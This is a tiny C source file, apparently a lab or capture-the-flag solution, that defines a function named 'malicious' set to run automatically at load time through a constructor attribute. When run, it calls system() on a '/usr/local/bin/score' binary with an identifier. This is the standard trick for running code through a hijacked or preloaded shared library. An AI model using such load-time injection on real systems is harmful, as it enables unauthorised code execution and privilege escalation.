#include<stdio.h>
#include<stdlib.h>
 
static void malicious() __attribute__((constructor));
 
void malicious() {
  system("/usr/local/bin/score 504b8416-d89e-4980-80ff-7cd7d4605752");
}
